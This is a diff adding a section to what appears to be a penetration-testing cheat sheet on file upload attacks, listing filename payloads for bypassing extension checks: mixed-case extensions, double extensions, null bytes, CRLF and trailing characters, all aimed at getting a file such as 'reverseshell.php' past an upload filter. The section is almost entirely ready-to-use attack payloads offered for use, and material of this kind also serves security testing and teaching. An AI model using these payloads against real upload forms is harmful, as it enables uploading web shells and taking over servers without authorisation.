@@ -128,7 +128,73 @@ https://weibell.github.io/reverse-shell-generator/
 
 ## 🔻Bypass the extension checks
 
+#### ➤ Using some uppercase letters
+```
+pHp, .pHP5, .aSPx, .jSp ...
+```
 
+#### ➤ Adding a valid extension before
+
+• As example, if the png are the only authorized extension:
+```
+reverseshell.png.php
+```
+
+• It is also possible to use the the uppercase letters
+```
+reverseshell.png.Php5
+reverseshell.png.pHTml
+``` 
+
+#### ➤ Add special characters at the end
+
+• Some examples
+```
+reverseshell.php%20
+reverseshell.php%0a
+reverseshell.php%00
+reverseshell.php%0d%0a
+reverseshell.php/
+reverseshell.php.\
+reverseshell.
+reverseshell.php....
+```
+
+• It is also possible to combine with the previous bypass
+```
+reverseshell.php5%0a
+reverseshell.pHP5%0a
+```
+
+#### ➤ Add a double extension and a junk data between them
+
+• Some examples
+```
+reverseshell.php#.png
+reverseshell.php%00.png
+reverseshell.php\x00.png
+reverseshell.php%0a.png
+reverseshell.php%0d%0a.png
+reverseshell.phpJunk123png
+```
+
+• It is also possible to combine with the uppercase
+```
+reverseshell.png%00pHp5
+```
+
+#### ➤ Add another layer of extensions
+
+• Some examples
+```
+file.png.jpg.php
+```
+
+• It is also possible to combine with the uppercase
+```
+file.php%00.png%00.jpg
+file.pHp%00.pNg%00.jPg
+```
 
 ## 🔻Bypass using the content-type
 
